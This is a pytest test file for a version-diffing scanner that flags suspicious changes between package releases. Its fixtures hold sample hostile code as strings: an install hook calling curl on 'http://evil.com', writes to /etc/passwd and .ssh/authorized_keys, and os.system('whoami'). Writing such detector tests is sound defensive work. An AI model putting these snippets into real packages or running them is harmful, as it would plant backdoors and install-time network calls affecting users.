"""Tests for Version Diffing (Sprint 3.3)."""

from __future__ import annotations

import os
import tempfile
from unittest.mock import MagicMock, patch

import pytest

from uast.version_diff import (
    VersionChange,
    VersionDiffer,
    VersionDiffResult,
    diff_to_signals,
)


class TestVersionDiffResult:
    """Tests for VersionDiffResult data class."""

    def test_to_dict_empty(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
        )
        d = result.to_dict()
        assert d["previous_version"] == "1.0"
        assert d["files_added"] == 0
        assert d["files_removed"] == 0
        assert d["files_modified"] == 0
        assert d["suspicious_changes"] == []

    def test_to_dict_with_changes(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            files_added=["new.py"],
            files_removed=["old.py"],
            files_modified=["changed.py"],
            suspicious_changes=[
                VersionChange(
                    change_type="new_suspicious_import",
                    severity="high",
                    description="New import subprocess",
                    file_path="__init__.py",
                    score=0.7,
                ),
            ],
        )
        d = result.to_dict()
        assert d["files_added"] == 1
        assert d["files_removed"] == 1
        assert d["files_modified"] == 1
        assert len(d["suspicious_changes"]) == 1
        assert d["suspicious_changes"][0]["type"] == "new_suspicious_import"


class TestVersionDiffer:
    """Tests for VersionDiffer internal methods."""

    def setup_method(self):
        self.differ = VersionDiffer()

    def test_extract_imports_basic(self):
        source = "import os\nimport subprocess\nfrom socket import socket\n"
        imports = self.differ._extract_imports(source)
        assert "os" in imports
        assert "subprocess" in imports
        assert "socket" in imports

    def test_extract_imports_from_import(self):
        source = "from os.path import join\nfrom base64 import b64decode\n"
        imports = self.differ._extract_imports(source)
        assert "os.path" in imports
        assert "base64" in imports

    def test_extract_imports_syntax_error(self):
        source = "this is not valid python {"
        imports = self.differ._extract_imports(source)
        assert imports == set()

    def test_extract_imports_empty(self):
        imports = self.differ._extract_imports("")
        assert imports == set()

    def test_shannon_entropy_low(self):
        """Repeated characters have low entropy."""
        entropy = self.differ._shannon_entropy("aaaaaaaaaa")
        assert entropy == 0.0

    def test_shannon_entropy_high(self):
        """Random-looking strings have high entropy."""
        # A string with many unique characters
        s = "aB3xQ7mK9pL2wR5yT8uI4oP6zN0vC1"
        entropy = self.differ._shannon_entropy(s)
        assert entropy > 4.0

    def test_shannon_entropy_empty(self):
        assert self.differ._shannon_entropy("") == 0.0

    def test_extract_string_literals(self):
        source = 'x = "hello"\ny = "world"\nz = 42\n'
        strings = self.differ._extract_string_literals(source)
        assert "hello" in strings
        assert "world" in strings

    def test_extract_string_literals_syntax_error(self):
        strings = self.differ._extract_string_literals("not valid {")
        assert strings == set()

    def test_has_install_hooks_true(self):
        source = """
import subprocess
class CustomInstall(install):
    def run(self):
        subprocess.run(['curl', 'http://evil.com'])
        install.run(self)
"""
        assert self.differ._has_install_hooks(source) is True

    def test_has_install_hooks_cmdclass(self):
        source = """
setup(
    name='pkg',
    cmdclass={'install': CustomInstall},
)
"""
        assert self.differ._has_install_hooks(source) is True

    def test_has_install_hooks_false(self):
        source = """
from setuptools import setup
setup(name='pkg', version='1.0')
"""
        assert self.differ._has_install_hooks(source) is False

    def test_find_sensitive_writes(self):
        source = """
with open('/etc/passwd', 'w') as f:
    f.write('evil')
"""
        writes = self.differ._find_sensitive_writes(source)
        assert "/etc/passwd" in writes

    def test_find_sensitive_writes_ssh(self):
        source = """
open('.ssh/authorized_keys', 'a').write(key)
"""
        writes = self.differ._find_sensitive_writes(source)
        assert ".ssh/authorized_keys" in writes

    def test_find_sensitive_writes_no_write_mode(self):
        source = """
with open('/etc/passwd', 'r') as f:
    data = f.read()
"""
        writes = self.differ._find_sensitive_writes(source)
        assert len(writes) == 0

    def test_find_sensitive_writes_safe_path(self):
        source = """
with open('output.txt', 'w') as f:
    f.write('hello')
"""
        writes = self.differ._find_sensitive_writes(source)
        assert len(writes) == 0

    def test_extract_dependencies(self):
        content = """
[options]
install_requires =
    requests>=2.31.0
    click>=8.0
    numpy>=1.20
"""
        deps = self.differ._extract_dependencies(content)
        assert "requests" in deps
        assert "click" in deps
        assert "numpy" in deps

    def test_extract_dependencies_pyproject(self):
        content = """
[project]
dependencies = [
    "requests>=2.31.0",
    "click>=8.1.0",
]
"""
        deps = self.differ._extract_dependencies(content)
        assert "requests" in deps
        assert "click" in deps


class TestCheckNewSuspiciousImports:
    """Tests for _check_new_suspicious_imports()."""

    def setup_method(self):
        self.differ = VersionDiffer()

    def test_new_subprocess_import(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            files_added=["pkg/__init__.py"],
            files_modified=[],
        )
        curr_files = {
            "pkg/__init__.py": "import subprocess\nimport os\n"
        }
        prev_files = {}

        self.differ._check_new_suspicious_imports(
            result, "", "", curr_files, prev_files,
        )
        assert len(result.suspicious_changes) >= 1
        types = {c.change_type for c in result.suspicious_changes}
        assert "new_suspicious_import" in types

    def test_existing_import_not_flagged(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            files_modified=["pkg/__init__.py"],
        )
        curr_files = {
            "pkg/__init__.py": "import subprocess\nimport os\n"
        }
        prev_files = {
            "pkg/__init__.py": "import subprocess\nimport os\n"
        }

        self.differ._check_new_suspicious_imports(
            result, "", "", curr_files, prev_files,
        )
        assert len(result.suspicious_changes) == 0


class TestCheckHighEntropyStrings:
    """Tests for _check_high_entropy_strings()."""

    def setup_method(self):
        self.differ = VersionDiffer()

    def test_new_high_entropy_string(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            files_added=["pkg/main.py"],
        )
        # Create a high-entropy string
        high_entropy = "aB3xQ7mK9pL2wR5yT8uI4oP6zN0vC1bD4eF5gH6jK7"
        curr_files = {
            "pkg/main.py": f'payload = "{high_entropy}"\n'
        }
        prev_files = {}

        self.differ._check_high_entropy_strings(
            result, "", "", curr_files, prev_files,
        )
        has_entropy_change = any(
            c.change_type == "high_entropy_string"
            for c in result.suspicious_changes
        )
        assert has_entropy_change

    def test_normal_string_not_flagged(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            files_added=["pkg/main.py"],
        )
        curr_files = {
            "pkg/main.py": 'msg = "hello world this is a normal string"\n'
        }
        prev_files = {}

        self.differ._check_high_entropy_strings(
            result, "", "", curr_files, prev_files,
        )
        has_entropy_change = any(
            c.change_type == "high_entropy_string"
            for c in result.suspicious_changes
        )
        assert not has_entropy_change


class TestCheckMetadataStripping:
    """Tests for _check_metadata_stripping()."""

    def setup_method(self):
        self.differ = VersionDiffer()

    def test_license_removed(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            files_removed=["LICENSE"],
        )
        self.differ._check_metadata_stripping(result)
        assert any(c.change_type == "metadata_stripped" for c in result.suspicious_changes)
        license_change = next(
            c for c in result.suspicious_changes if "LICENSE" in c.description
        )
        assert license_change.severity == "medium"

    def test_readme_removed(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            files_removed=["README.md"],
        )
        self.differ._check_metadata_stripping(result)
        assert any(c.change_type == "metadata_stripped" for c in result.suspicious_changes)

    def test_normal_file_removed_not_flagged(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            files_removed=["old_module.py"],
        )
        self.differ._check_metadata_stripping(result)
        assert len(result.suspicious_changes) == 0


class TestCheckSetupChanges:
    """Tests for _check_setup_changes()."""

    def setup_method(self):
        self.differ = VersionDiffer()

    def test_new_setup_with_hooks(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            files_added=["setup.py"],
        )
        curr_files = {
            "setup.py": """
import subprocess
class CustomInstall(install):
    def run(self):
        subprocess.run(['curl', 'http://evil.com'])
"""
        }
        prev_files = {}
        self.differ._check_setup_changes(result, "", "", curr_files, prev_files)
        assert any(c.change_type == "new_setup_code" for c in result.suspicious_changes)

    def test_modified_setup_new_hooks(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            files_modified=["setup.py"],
        )
        curr_files = {
            "setup.py": "import subprocess\nos.system('whoami')\n"
        }
        prev_files = {
            "setup.py": "from setuptools import setup\nsetup(name='pkg')\n"
        }
        self.differ._check_setup_changes(result, "", "", curr_files, prev_files)
        assert any(c.change_type == "new_setup_code" for c in result.suspicious_changes)


class TestFindPreviousVersion:
    """Tests for _find_previous_version()."""

    def setup_method(self):
        self.differ = VersionDiffer()

    @patch("uast.version_diff.http_client")
    def test_finds_previous_version(self, mock_client):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "releases": {
                "1.0.0": [],
                "1.1.0": [],
                "2.0.0": [],
                "2.1.0": [],
            }
        }
        mock_client.get.return_value = mock_resp

        prev = self.differ._find_previous_version("test-pkg", "2.1.0")
        assert prev == "2.0.0"

    @patch("uast.version_diff.http_client")
    def test_no_previous_version(self, mock_client):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "releases": {"1.0.0": []}
        }
        mock_client.get.return_value = mock_resp

        prev = self.differ._find_previous_version("test-pkg", "1.0.0")
        assert prev is None

    @patch("uast.version_diff.http_client")
    def test_api_error(self, mock_client):
        mock_resp = MagicMock()
        mock_resp.status_code = 404
        mock_client.get.return_value = mock_resp

        prev = self.differ._find_previous_version("test-pkg", "1.0.0")
        assert prev is None


class TestDiffToSignals:
    """Tests for diff_to_signals()."""

    def test_empty_result_no_signals(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
        )
        signals = diff_to_signals(result)
        assert signals == []

    def test_error_result_no_signals(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version=None,
            error="No previous version found",
        )
        signals = diff_to_signals(result)
        assert signals == []

    def test_suspicious_changes_produce_signal(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            suspicious_changes=[
                VersionChange(
                    change_type="new_suspicious_import",
                    severity="high",
                    description="New import subprocess",
                    file_path="__init__.py",
                    score=0.7,
                ),
            ],
        )
        signals = diff_to_signals(result)
        assert len(signals) == 1
        assert signals[0].signal_id == "VDIFF-001"
        assert signals[0].severity == "high"
        assert signals[0].score_contribution == 0.7

    def test_critical_severity_mapping(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            suspicious_changes=[
                VersionChange(
                    change_type="new_sensitive_write",
                    severity="critical",
                    description="Write to /etc/passwd",
                    file_path="setup.py",
                    score=0.9,
                ),
            ],
        )
        signals = diff_to_signals(result)
        assert signals[0].severity == "critical"

    def test_low_severity_mapping(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            suspicious_changes=[
                VersionChange(
                    change_type="new_dependencies",
                    severity="low",
                    description="New deps added",
                    file_path="setup.cfg",
                    score=0.2,
                ),
            ],
        )
        signals = diff_to_signals(result)
        assert signals[0].severity == "low"

    def test_multiple_changes_take_worst(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0",
            previous_version="1.0",
            suspicious_changes=[
                VersionChange(
                    change_type="new_dependencies",
                    severity="low",
                    description="New deps",
                    file_path="setup.cfg",
                    score=0.2,
                ),
                VersionChange(
                    change_type="new_sensitive_write",
                    severity="critical",
                    description="Write to /etc/",
                    file_path="setup.py",
                    score=0.9,
                ),
                VersionChange(
                    change_type="high_entropy_string",
                    severity="medium",
                    description="High entropy",
                    file_path="main.py",
                    score=0.5,
                ),
            ],
        )
        signals = diff_to_signals(result)
        assert len(signals) == 1
        assert signals[0].score_contribution == 0.9
        assert signals[0].severity == "critical"

    def test_signal_title_includes_versions(self):
        result = VersionDiffResult(
            package_name="test",
            current_version="2.0.1",
            previous_version="1.9.0",
            suspicious_changes=[
                VersionChange(
                    change_type="metadata_stripped",
                    severity="medium",
                    description="LICENSE removed",
                    file_path="LICENSE",
                    score=0.4,
                ),
            ],
        )
        signals = diff_to_signals(result)
        assert "v1.9.0" in signals[0].title
        assert "v2.0.1" in signals[0].title


class TestCollectFiles:
    """Tests for _collect_files()."""

    def setup_method(self):
        self.differ = VersionDiffer()

    def test_collects_files(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create some files
            os.makedirs(os.path.join(tmpdir, "pkg"))
            with open(os.path.join(tmpdir, "pkg", "__init__.py"), "w") as f:
                f.write("import os\n")
            with open(os.path.join(tmpdir, "pkg", "main.py"), "w") as f:
                f.write("print('hello')\n")
            with open(os.path.join(tmpdir, "README.md"), "w") as f:
                f.write("# Test\n")

            files = self.differ._collect_files(tmpdir)
            assert len(files) == 3
            assert any("__init__.py" in k for k in files)
            assert any("main.py" in k for k in files)
            assert any("README.md" in k for k in files)

    def test_collects_empty_dir(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            files = self.differ._collect_files(tmpdir)
            assert files == {}
